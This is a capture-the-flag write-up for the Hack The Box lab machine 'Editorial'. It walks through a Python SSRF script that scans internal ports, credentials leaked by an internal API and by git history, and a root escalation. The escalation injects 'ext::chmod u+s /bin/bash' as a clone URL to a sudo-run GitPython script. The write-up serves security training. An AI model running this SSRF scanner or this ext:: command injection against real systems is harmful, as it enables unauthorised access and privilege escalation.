# Hack The Box - Editorial Writeup

## Machine Information

* **Machine Name:** Editorial
* **Operating System:** Linux
* **Difficulty:** Easy
* **Skills Learned:**

  * SSRF exploitation
  * Internal service enumeration
  * Git history analysis
  * Credential discovery
  * Privilege escalation via GitPython and the `ext::` protocol

---

# Enumeration

## Nmap Scan

I started by scanning the target:

```bash
nmap -sC -sV editorial.htb
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)

Service Info: OS: Linux
```

Visiting the website redirected me to:

```text
http://editorial.htb
```

---

# Initial Foothold

## Discovering the Upload Functionality

While exploring the website, I found the following endpoint:

```text
http://editorial.htb/upload-cover
```

The page contained:

* A URL input field
* A file upload field

This immediately suggested two possible attack vectors:

* Server-Side Request Forgery (SSRF)
* File Upload vulnerabilities

---

## Testing the Upload Form

Uploading arbitrary files and providing random URLs always returned the same image:

```text
/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

Because the file upload appeared to be sanitized, SSRF became the most promising attack path.

---

# SSRF Exploitation

## Port Discovery

To enumerate internal services, I created a Python script that repeatedly sent requests to localhost ports through the vulnerable endpoint.

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

URL = "http://editorial.htb/upload-cover"

BOUNDARY = "----geckoformboundary7bf067ac4f65159bebb91a3d56a70014"

NOT_FOUND_INDICATOR = (
    "/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg"
)

THREADS = 100

stop_event = Event()

jpeg_header = b"\xff\xd8\xff\xe0"

headers = {
    "Host": "editorial.htb",
    "Origin": "http://editorial.htb",
    "Referer": "http://editorial.htb/upload",
    "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
}

def check_port(port):
    if stop_event.is_set():
        return None

    target = f"http://127.0.0.1:{port}"

    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
        f"{target}\r\n"
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="bookfile"; '
        'filename="image.jpg"\r\n'
        "Content-Type: image/jpeg\r\n\r\n"
    ).encode()

    body += jpeg_header
    body += f"\r\n--{BOUNDARY}--\r\n".encode()

    try:
        response = requests.post(
            URL,
            headers=headers,
            data=body,
            timeout=3,
        )

        if NOT_FOUND_INDICATOR not in response.text:
            stop_event.set()
            return port

    except requests.RequestException:
        pass

    return None

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = {
        executor.submit(check_port, port): port
        for port in range(1, 10001)
    }

    for future in as_completed(futures):
        result = future.result()

        if result is not None:
            print(f"[+] Interesting port found: {result}")
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

The script identified:

```text
127.0.0.1:5000
```

The response was:

```text
/static/uploads/859d901c-5cc0-48bf-a148-47b6d7d656be
```

---

## Enumerating the Internal API

Visiting the uploaded file revealed internal API endpoints:

```json
{
  "messages": [
    {
      "promotions": {
        "endpoint": "/api/latest/metadata/messages/promos"
      }
    },
    {
      "coupons": {
        "endpoint": "/api/latest/metadata/messages/coupons"
      }
    },
    {
      "new_authors": {
        "endpoint": "/api/latest/metadata/messages/authors"
      }
    }
  ]
}
```

The most interesting endpoint was:

```text
/api/latest/metadata/messages/authors
```

Using SSRF:

```text
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

The response generated:

```text
/static/uploads/06edcc2e-92bd-4c50-a09b-4851dd3d5c6f
```

Opening the file exposed credentials:

```text
Username: dev
Password: dev080217_devAPI!@
```

---

# User Access

## SSH Login

```bash
ssh dev@editorial.htb
```

After logging in, I obtained the user flag.

---

# Git History Analysis

Inside the home directory, I found a Git repository:

```bash
~/apps/.git
```

Checking the commit history:

```bash
git log --oneline --all
```

Output:

```text
8ad0f31 fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

The commit `b73481b` looked particularly interesting.

```bash
git show b73481b
```

The diff revealed production credentials:

```diff
- Username: prod
- Password: 080217_Producti0n_2023!@

+ Username: dev
+ Password: dev080217_devAPI!@
```

Recovered credentials:

```text
Username: prod
Password: 080217_Producti0n_2023!@
```

---

# Privilege Escalation

## Switching to the Production User

```bash
ssh prod@editorial.htb
```

---

## Checking Sudo Permissions

```bash
sudo -l
```

Output:

```text
User prod may run the following commands on editorial:

(root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

---

## Reviewing the Vulnerable Script

```bash
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(
    url_to_clone,
    'new_changes',
    multi_options=["-c protocol.ext.allow=always"]
)
```

The issue lies in:

```python
multi_options=["-c protocol.ext.allow=always"]
```

Git's `ext::` protocol allows execution of arbitrary commands, and the script passes user-controlled input directly to `clone_from()` while running as root.

---

## Exploiting Git's `ext::` Protocol

Grant the SUID bit to `/bin/bash`:

```bash
sudo /usr/bin/python3 \
/opt/internal_apps/clone_changes/clone_prod_change.py \
'ext::chmod u+s /bin/bash'
```

Verify:

```bash
ls -l /bin/bash
```

Expected output:

```text
-rwsr-xr-x
```

Spawn a root shell:

```bash
/bin/bash -p
```

---

# Root Flag

```bash
cat /root/root.txt
```

---

# Conclusion

This machine demonstrated a realistic attack chain:

1. Discovering an SSRF vulnerability.
2. Enumerating internal services.
3. Accessing hidden API endpoints.
4. Recovering credentials.
5. Analyzing Git history.
6. Escalating privileges through an insecure GitPython configuration.

The key takeaway is that internal services, Git history, and dangerous Git transport protocols can significantly expand the attack surface when combined with SSRF.
